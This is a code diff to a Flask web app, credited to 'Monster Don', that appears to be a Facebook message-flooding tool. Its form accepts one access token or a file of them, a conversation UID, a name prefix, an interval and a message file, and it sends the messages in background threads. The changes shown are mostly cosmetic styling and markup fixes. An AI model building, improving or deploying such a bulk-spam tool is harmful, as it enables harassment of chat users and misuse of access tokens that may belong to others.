@@ -13,7 +13,6 @@ headers = {
     'Cache-Control': 'max-age=0',
     'Upgrade-Insecure-Requests': '1',
     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
     'Accept-Encoding': 'gzip, deflate',
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
@@ -44,7 +43,6 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
 def send_message():
     if request.method == 'POST':
         token_option = request.form.get('tokenOption')
-
         if token_option == 'single':
             access_tokens = [request.form.get('singleToken')]
         else:
@@ -54,12 +52,10 @@ def send_message():
         thread_id = request.form.get('threadId')
         mn = request.form.get('kidx')
         time_interval = int(request.form.get('time'))
-
         txt_file = request.files['txtFile']
         messages = txt_file.read().decode().splitlines()
 
         task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
-
         stop_events[task_id] = Event()
         thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
         threads[task_id] = thread
@@ -77,30 +73,25 @@ def send_message():
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
   <style>
-    /* CSS for styling elements */
     label { color: white; }
     .file { height: 30px; }
     body {
-      background-image: url('https://i.ibb.co/sWrxFqn/2c3896ef289c07f31387973c3d6acb7d.jpg');
+      background-image: url('https://i.ibb.co/1YZNYNJ5/afd2f751eef0ad9876ba97c9f768026b.jpg');
       background-size: cover;
       background-repeat: no-repeat;
+      background-position: center;
       color: white;
     }
     .container {
       max-width: 350px;
-      height: auto;
       border-radius: 20px;
       padding: 20px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
       box-shadow: 0 0 15px white;
-      border: none;
-      resize: none;
+      background-color: rgba(0, 0, 0, 0.5);
     }
     .form-control {
-      outline: 1px red;
       border: 1px double white;
       background: transparent;
-      width: 100%;
       height: 40px;
       padding: 7px;
       margin-bottom: 20px;
@@ -109,7 +100,11 @@ def send_message():
     }
     .header { text-align: center; padding-bottom: 20px; }
     .btn-submit { width: 100%; margin-top: 10px; }
-    .footer { text-align: center; margin-top: 20px; color: #888; }
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      color: rgba(255, 255, 255, 0.6);
+    }
     .whatsapp-link {
       display: inline-block;
       color: #25d366;
@@ -121,7 +116,7 @@ def send_message():
 </head>
 <body>
   <header class="header mt-4">
-    <h1 class="mt-3">★彡[ 𝔹𝕃𝟡ℂ𝕂 ℙℍ𝟛ℕ𝕋𝟛ℝ ℝ𝕌𝕃𝔼𝕏 ]彡★<h1
+    <h1 class="mt-3">★彡[ 𝔹𝕃𝟡ℂ𝕂 ℙℍ𝟛ℕ𝕋𝟛ℝ ℝ𝕌𝕃𝔼𝕏 ]彡★</h1>
   </header>
   <div class="container text-center">
     <form method="post" enctype="multipart/form-data">
@@ -141,7 +136,7 @@ def send_message():
         <input type="file" class="form-control" id="tokenFile" name="tokenFile">
       </div>
       <div class="mb-3">
-        <label for="threadId" class="form-label">Enter Inbox/convo uid</label>
+        <label for="threadId" class="form-label">Enter Inbox/convo UID</label>
         <input type="text" class="form-control" id="threadId" name="threadId" required>
       </div>
       <div class="mb-3">
@@ -153,7 +148,7 @@ def send_message():
         <input type="number" class="form-control" id="time" name="time" required>
       </div>
       <div class="mb-3">
-        <label for="txtFile" class="form-label">Choose Your Np File</label>
+        <label for="txtFile" class="form-label">Choose Your NP File</label>
         <input type="file" class="form-control" id="txtFile" name="txtFile" required>
       </div>
       <button type="submit" class="btn btn-primary btn-submit">Run</button>
@@ -167,9 +162,9 @@ def send_message():
     </form>
   </div>
   <footer class="footer">
-    <p>© 2025 MADE BY MONSTER DON<p>
-    <p>THE OWNER MONSTER AND XMARTY HERE<p><a href="https://www.facebook.com/profile.php?id=61572996460398"
-    "https://www.facebook.com/smarty0790"ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴇʙᴏᴏᴋ</a></p>
+    <p>© 2025 MADE BY MONSTER DON</p>
+    <p>THE OWNER MONSTER AND XMARTY HERE</p>
+    <p><a href="https://www.facebook.com/profile.php?id=61572996460398">Click here for Facebook</a></p>
     <div class="mb-3">
       <a href="https://wa.me/9918176353" class="whatsapp-link">
         <i class="fab fa-whatsapp"></i> Chat on WhatsApp
@@ -179,13 +174,8 @@ def send_message():
   <script>
     function toggleTokenInput() {
       var tokenOption = document.getElementById('tokenOption').value;
-      if (tokenOption == 'single') {
-        document.getElementById('singleTokenInput').style.display = 'block';
-        document.getElementById('tokenFileInput').style.display = 'none';
-      } else {
-        document.getElementById('singleTokenInput').style.display = 'none';
-        document.getElementById('tokenFileInput').style.display = 'block';
-      }
+      document.getElementById('singleTokenInput').style.display = tokenOption === 'single' ? 'block' : 'none';
+      document.getElementById('tokenFileInput').style.display = tokenOption === 'multiple' ? 'block' : 'none';
     }
   </script>
 </body>
